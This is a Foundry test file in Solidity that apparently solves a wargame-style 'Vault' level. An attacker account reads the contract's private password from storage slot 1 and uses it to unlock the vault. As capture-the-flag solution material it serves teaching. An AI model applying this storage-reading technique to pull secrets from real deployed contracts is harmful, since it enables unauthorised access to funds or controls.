// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/08_Vault.sol";

contract VaultTest is Test {
    Vault _vault;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        bytes32 password = "A super secret password!";
        _vault = new Vault(password);

    }

    function testSolution() public {
        vm.startPrank(attacker);
       
        bytes32 value = vm.load(address(_vault), bytes32(uint256(1))); // Storage slot 1

        _vault.unlock(value);

        assertTrue(!_vault.locked(), "Vault is locked!");
    }
}
